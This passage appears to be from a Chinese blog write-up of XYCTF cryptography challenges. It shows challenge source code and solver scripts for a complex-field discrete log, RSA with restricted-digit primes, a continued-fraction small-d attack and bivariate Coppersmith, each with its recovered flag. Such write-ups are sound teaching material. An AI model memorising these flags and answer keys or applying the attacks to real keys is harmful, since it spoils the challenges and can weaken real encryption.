<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python3">from Crypto.Util.number import *<br>from secrets import flag<br><br><br>class Complex:<br>    def __init__(self, re, im):<br>        self.re = re<br>        self.im = im<br><br>    def __mul__(self, c):<br>        re_ = self.re * c.re - self.im * c.im<br>        im_ = self.re * c.im + self.im * c.re<br>        return Complex(re_, im_)<br><br>    def __str__(self):<br>        if self.im == 0:<br>            return str(self.re)<br>        elif self.re == 0:<br>            if abs(self.im) == 1:<br>                return f&quot;&#123;&#x27;-&#x27; if self.im &lt; 0 else &#x27;&#x27;&#125;i&quot;<br>            else:<br>                return f&quot;&#123;self.im&#125;i&quot;<br>        else:<br>            return f&quot;&#123;self.re&#125; &#123;&#x27;+&#x27; if self.im &gt; 0 else &#x27;-&#x27;&#125; &#123;abs(self.im)&#125;i&quot;<br><br><br>def complex_pow(c, exp, n):<br>    result = Complex(1, 0)<br>    while exp &gt; 0:<br>        if exp &amp; 1:<br>            result = result * c<br>            result.re = result.re % n<br>            result.im = result.im % n<br>        c = c * c<br>        c.re = c.re % n<br>        c.im = c.im % n<br>        exp &gt;&gt;= 1<br>    return result<br><br><br>flag = flag.strip(b&quot;XYCTF&#123;&quot;).strip(b&quot;&#125;&quot;)<br>p = 1127236854942215744482170859284245684922507818478439319428888584898927520579579027<br>g = Complex(3, 7)<br>x = bytes_to_long(flag)<br>print(complex_pow(g, x, p))<br># 5699996596230726507553778181714315375600519769517892864468100565238657988087817 + 198037503897625840198829901785272602849546728822078622977599179234202360717671908i<br><br></code></pre></td></tr></table></figure>

<p>定义了一个复数类，flag为指数。考点在复数域下求离散对数，先将复数转换成实数，再求离散对数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sagemath">g=3^2+7^2<br>a,b=5699996596230726507553778181714315375600519769517892864468100565238657988087817 , 198037503897625840198829901785272602849546728822078622977599179234202360717671908<br>c=a^2+b^2<br>p=1127236854942215744482170859284245684922507818478439319428888584898927520579579027<br>from Crypto.Util.number import *<br>G=Zmod(p) <br>g=G(g) <br>c=G(c) <br>print(long_to_bytes(ZZ(discrete_log(c,g))))<br>#___c0mp13x_d1p_15_3@5y_f0r_y0u___<br></code></pre></td></tr></table></figure>

<h3 id="第8题：happy-to-solve2"><a href="#第8题：happy-to-solve2" class="headerlink" title="第8题：happy_to_solve2"></a>第8题：happy_to_solve2</h3><p>源码：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">import random<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import *<br><span class="hljs-selector-tag">from</span> secrets import flag<br><br><br>def get_happy_prime():<br>    while <span class="hljs-number">1</span>:<br>        p = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>([random.<span class="hljs-built_in">choice</span>(<span class="hljs-string">&quot;123&quot;</span>) for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]))<br>        q = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>([random.<span class="hljs-built_in">choice</span>(<span class="hljs-string">&quot;567&quot;</span>) for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]))<br>        if <span class="hljs-built_in">isPrime</span>(p) and <span class="hljs-built_in">isPrime</span>(q):<br>            return (p,q)<br><br>m = <span class="hljs-built_in">bytes_to_long</span>(flag)<br>p ,q= <span class="hljs-built_in">get_happy_prime</span>()<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br># <span class="hljs-number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span><br># <span class="hljs-number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span><br><br></code></pre></td></tr></table></figure>

<p>p,q的十进制位由特定数字123和456组成，对于任意a,b,c,d，组成的10进制数ab,cd存在<br>$$<br>n&#x3D;p<em>q&#x3D;(10</em>a+b)(10<em>c+d)&#x3D;a</em>c<em>100^2+(b</em>c+a*d)<em>10+b</em>d<br>$$</p>
<p>$$<br>n-b<em>d&#x3D;a</em>c<em>100^2+(b</em>c+a*d)*10<br>$$</p>
<p>故n-b*d结果的b,d所在十进制位为0，p,q的一个十进制位有3种可能，一组p,q相同位有9种，爆破找到其中满足条件的</p>
<p>exp</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">n</span>=697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">c</span>=153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-attribute">p</span>=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">q</span>=<span class="hljs-string">&#x27;&#x27;</span><br>def get_pq(p1,q1,i):<br>    a=[]<br>    <span class="hljs-keyword">for</span> pi <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;123&#x27;</span>:<br>        <span class="hljs-keyword">for</span> qi <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;567&#x27;</span>:<br>            p = pi + p1<br>            q = qi + q1<br>            p,<span class="hljs-attribute">q</span>=map(int,[p,q])<br><br>            <span class="hljs-keyword">if</span> (n - p * q) % pow(10, i+1) == 0:<br>                a.append([p,q])<br>    return a<br>PQ=[[p,q]]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(512):<br>    tmp_PQ=[]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> PQ:<br>        p,<span class="hljs-attribute">q</span>=j<br>        tmp_PQ+=get_pq(str(p),str(q),i)<br>    <span class="hljs-attribute">PQ</span>=tmp_PQ<br><span class="hljs-keyword">for</span> p,q <span class="hljs-keyword">in</span> PQ:<br>    <span class="hljs-keyword">if</span> isPrime(p):<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;&#123;p=&#125;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;&#123;q=&#125;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(n % p, n % q, n == p * q)<br>        d = invert(e, (p - 1) * (q - 1))<br>        m = powmod(c, d, n)<br>        <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;XYCTF&#123;7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0&#125;&#x27;</span><br></code></pre></td></tr></table></figure>



<h3 id="第9题：factor3"><a href="#第9题：factor3" class="headerlink" title="第9题：factor3"></a>第9题：factor3</h3><p>题目：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">import</span> random<br><br><span class="hljs-attribute">flag</span> = b&#x27;XYCTF&#123;*****&#125;&#x27;<br><span class="hljs-attribute">m</span> = bytes_to_long(flag)<br><span class="hljs-attribute">def</span> gainPrime():<br>    <span class="hljs-attribute">while</span> True:<br>        <span class="hljs-attribute">x</span> = random.getrandbits(<span class="hljs-number">256</span>)<br>        <span class="hljs-attribute">y</span> = random.getrandbits(<span class="hljs-number">256</span>)<br><br>        <span class="hljs-attribute">if</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">continue</span><br><br>        <span class="hljs-attribute">p</span> = x ** <span class="hljs-number">3</span> + <span class="hljs-number">3</span> * y ** <span class="hljs-number">3</span><br>        <span class="hljs-attribute">if</span> p.bit_length() == <span class="hljs-number">768</span> and p % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> and isPrime(p):<br>            <span class="hljs-attribute">return</span> p<br><br><span class="hljs-attribute">p</span>, q = gainPrime(), gainPrime()<br><span class="hljs-attribute">N</span> = p * q<br><span class="hljs-attribute">phi</span> = (p ** <span class="hljs-number">2</span> + p + <span class="hljs-number">1</span>) * (q ** <span class="hljs-number">2</span> + q + <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = getPrime(<span class="hljs-number">320</span>)<br><span class="hljs-attribute">e</span> = inverse(d, phi)<br><span class="hljs-attribute">c</span> = d**<span class="hljs-number">2</span>^m<br><br><span class="hljs-attribute">print</span>(f<span class="hljs-string">&quot;N: &#123;N&#125;&quot;</span>)<br><span class="hljs-attribute">print</span>(f<span class="hljs-string">&quot;e: &#123;e&#125;&quot;</span>)<br><span class="hljs-attribute">print</span>(f<span class="hljs-string">&quot;c: &#123;c&#125;&quot;</span>)<br><br><span class="hljs-attribute">N</span>: <span class="hljs-number">913125842482770239379848062277162627509794409924607555622246822717218133091223291889541294440266178282194506242444509803611492259403578922020590849630191477864719052980160940803309686069818208833547621252544423652489179493083138385424424384165228024273745733240109761707533778691158938848158094054261174692601673435971526522219273943464877956131040249169850420336023942653021547841666224446678539579529590840999008107782784268926145671962239929431694391039559247</span><br><span class="hljs-attribute">e</span>: <span class="hljs-number">494518390582436635999115147756676313570637682518235195828939117782099618734167908630788943568232122157772909140885391963441876427590731524706959546524212914108888799081844320513851526790475333924396837458796755678072486028072639014677580265244176441153444956871730684233063789931539669072735599696830757690822185323538738397827461580678488181113667710378657058297572328491762536595872579603698945272140918157163640403488075948987156585480146162739943419183496337465468187233821931312507662218106713861638334075899266373256620752680354704533272722692596941861606161634082613228896420520465402725359166156632884432690715903666803067996854084671477445131853993177110154928274312496230096270510089973592664248613332000290545537840595645944390047611474888693558676781309912289044962293014118087259307560444929227407113819165713213046898243995956550944640168932947118400215917515277554126694376415569909534496134700668701465649939</span><br><span class="hljs-attribute">c</span>: <span class="hljs-number">4450931337369461482106945992542133557585962894030505065110870389112565329875502952762182372926117037373210509516570958483606566274369840551132381128665744266165792377925899683228751870742727716</span><br></code></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">n= <span class="hljs-number">913125842482770239379848062277162627509794409924607555622246822717218133091223291889541294440266178282194506242444509803611492259403578922020590849630191477864719052980160940803309686069818208833547621252544423652489179493083138385424424384165228024273745733240109761707533778691158938848158094054261174692601673435971526522219273943464877956131040249169850420336023942653021547841666224446678539579529590840999008107782784268926145671962239929431694391039559247</span><br>e= <span class="hljs-number">494518390582436635999115147756676313570637682518235195828939117782099618734167908630788943568232122157772909140885391963441876427590731524706959546524212914108888799081844320513851526790475333924396837458796755678072486028072639014677580265244176441153444956871730684233063789931539669072735599696830757690822185323538738397827461580678488181113667710378657058297572328491762536595872579603698945272140918157163640403488075948987156585480146162739943419183496337465468187233821931312507662218106713861638334075899266373256620752680354704533272722692596941861606161634082613228896420520465402725359166156632884432690715903666803067996854084671477445131853993177110154928274312496230096270510089973592664248613332000290545537840595645944390047611474888693558676781309912289044962293014118087259307560444929227407113819165713213046898243995956550944640168932947118400215917515277554126694376415569909534496134700668701465649939</span><br>c= <span class="hljs-number">4450931337369461482106945992542133557585962894030505065110870389112565329875502952762182372926117037373210509516570958483606566274369840551132381128665744266165792377925899683228751870742727716</span><br>n=n**<span class="hljs-number">2</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,numerator,denumerator</span>):<br>        self.numberlist = [] <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = [] <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList (numerator, denumerator)<br>        self.GenerateFractionList ()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span> (self, numerator, denumerator):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append (quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span> (self) :<br>        self.fractionlist.append ([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span> (self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (i) :<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i-j-<span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br>a = ContinuedFraction(e,n)<br><span class="hljs-keyword">for</span> k,d <span class="hljs-keyword">in</span> a.fractionlist:<br>    s = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(d ** <span class="hljs-number">2</span> ^ c).decode())<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-comment">#XYCTF&#123;I_love_to_read_the_crypto_paper_and_try_to_ak_them&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="第10题：反方向的密码-情难"><a href="#第10题：反方向的密码-情难" class="headerlink" title="第10题：反方向的密码 情难"></a>第10题：反方向的密码 情难</h3><p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha512(x.encode()).digest() * <span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-keyword">return</span> (message[: <span class="hljs-built_in">len</span>(message) // <span class="hljs-number">2</span>] + <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(message))) + message[<span class="hljs-built_in">len</span>(message) // <span class="hljs-number">2</span> :])<br><br><br>p = getStrongPrime(<span class="hljs-number">1024</span>)<br>q = getStrongPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">2</span><br>m = bytes_to_long(pad(flag))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># 3335299537518434350008670067273514020883265809787658909900831303201069228111667477512288715627313377374377192065531931991830331266940281529429758933125645068623703704431432931062515459304407129764836169638068667723468109909932687335727824459807903558617156661138991973933280805156893120951135488168923425258119689993859896540097318197048436676318334502053269738046279338047497258783747007084564814994803144049365117574904704816542523015746396519693505167963245600047742456478545640334467678554748227823020862550712083249012329745708139070338928730226897923885785783461594034339595106377701306570280371612953393097739</span><br><span class="hljs-comment"># 26278624299187148406559772770865336226934633734285979741424867540828670397865189685966828527168795621543490979182417570078991930822041468539855006585233692884235331084907340302530060261742100702658312435180527335101284800616106884692498603300926488358017928867672861988448488439356448543527810620591324774111321619391264173779312033252573140028630441135269056099074531502841259940379636699304810677716177080486265721322966814104627525953974143476452058638927511594884002185219080847495835727300670028011001853179659250270200020884333850083063514830095064730932997593930711871108436386821290545084229347398808220810263</span><br><br></code></pre></td></tr></table></figure>

<p>与反方向的密码相思不同是，这里的sha256换成了sha512,放在了flag中间，采用二元coppersmith</p>
<p>exp：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>=<span class="hljs-number">3335299537518434350008670067273514020883265809787658909900831303201069228111667477512288715627313377374377192065531931991830331266940281529429758933125645068623703704431432931062515459304407129764836169638068667723468109909932687335727824459807903558617156661138991973933280805156893120951135488168923425258119689993859896540097318197048436676318334502053269738046279338047497258783747007084564814994803144049365117574904704816542523015746396519693505167963245600047742456478545640334467678554748227823020862550712083249012329745708139070338928730226897923885785783461594034339595106377701306570280371612953393097739</span><br><span class="hljs-attribute">n</span>=<span class="hljs-number">26278624299187148406559772770865336226934633734285979741424867540828670397865189685966828527168795621543490979182417570078991930822041468539855006585233692884235331084907340302530060261742100702658312435180527335101284800616106884692498603300926488358017928867672861988448488439356448543527810620591324774111321619391264173779312033252573140028630441135269056099074531502841259940379636699304810677716177080486265721322966814104627525953974143476452058638927511594884002185219080847495835727300670028011001853179659250270200020884333850083063514830095064730932997593930711871108436386821290545084229347398808220810263</span><br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">2</span><br><span class="hljs-attribute">import</span> itertools<br><br><span class="hljs-attribute">def</span> small_roots(f, bounds, m=<span class="hljs-number">1</span>, d=None):<br>    <span class="hljs-attribute">if</span> not d:<br>        <span class="hljs-attribute">d</span> = f.degree()<br>    <span class="hljs-attribute">R</span> = f.base_ring()<br>    <span class="hljs-attribute">N</span> = R.cardinality()<br>    <span class="hljs-attribute">f</span> /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-attribute">f</span> = f.change_ring(ZZ)<br>    <span class="hljs-attribute">G</span> = Sequence([], f.parent())<br>    <span class="hljs-attribute">for</span> i in range(m+<span class="hljs-number">1</span>):<br>        <span class="hljs-attribute">base</span> = N^(m-i) * f^i<br>        <span class="hljs-attribute">for</span> shifts in itertools.product(range(d), repeat=f.nvariables()):<br>            <span class="hljs-attribute">g</span> = base * prod(map(power, f.variables(), shifts))<br>            <span class="hljs-attribute">G</span>.append(g)<br>    <span class="hljs-attribute">B</span>, monomials = G.coefficient_matrix()<br>    <span class="hljs-attribute">monomials</span> = vector(monomials)<br>    <span class="hljs-attribute">factors</span> =<span class="hljs-meta"> [monomial(*bounds) for monomial in monomials]</span><br>    <span class="hljs-attribute">for</span> i, factor in enumerate(factors):<br>        <span class="hljs-attribute">B</span>.rescale_col(i, factor)<br>    <span class="hljs-attribute">B</span> = B.dense_matrix().LLL()<br>    <span class="hljs-attribute">B</span> = B.change_ring(QQ)<br>    <span class="hljs-attribute">for</span> i, factor in enumerate(factors):<br>        <span class="hljs-attribute">B</span>.rescale_col(i, <span class="hljs-number">1</span>/factor)<br>    <span class="hljs-attribute">H</span> = Sequence([], f.parent().change_ring(QQ))<br>    <span class="hljs-attribute">for</span> h in filter(None, B*monomials):<br>        <span class="hljs-attribute">H</span>.append(h)<br>        <span class="hljs-attribute">I</span> = H.ideal()<br>        <span class="hljs-attribute">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            <span class="hljs-attribute">H</span>.pop()<br>        <span class="hljs-attribute">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">roots</span> =<span class="hljs-meta"> []</span><br>            <span class="hljs-attribute">for</span> root in I.variety(ring=ZZ):<br>                <span class="hljs-attribute">root</span> = tuple(R(root[var]) for var in f.variables())<br>                <span class="hljs-attribute">roots</span>.append(root)<br>            <span class="hljs-attribute">return</span> roots<br>    <span class="hljs-attribute">return</span><span class="hljs-meta"> []</span><br><br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">m0</span>=bytes_to_long(b&#x27;XYCTF&#123;&#x27;)<br><span class="hljs-attribute">m3</span>=bytes_to_long(b&#x27;&#125;&#x27;)<br><span class="hljs-attribute">def</span> hash(x):<br>    <span class="hljs-attribute">return</span> hashlib.sha512(x.encode()).digest() * <span class="hljs-number">2</span><br><br><span class="hljs-attribute">num</span>=<span class="hljs-number">1024</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">80</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">R</span>.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>    <span class="hljs-attribute">m2</span>=bytes_to_long(hash(str(i)))<br>    <span class="hljs-attribute">N</span>=(((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i//<span class="hljs-number">2</span>-<span class="hljs-number">6</span>))+x)*<span class="hljs-number">2</span>^num+m2)*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i-i//<span class="hljs-number">2</span>))+y*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)^e-c<br>    <span class="hljs-attribute">m1</span>=small_roots(N, (<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i//<span class="hljs-number">2</span>-<span class="hljs-number">6</span>)), <span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i-i//<span class="hljs-number">2</span>-<span 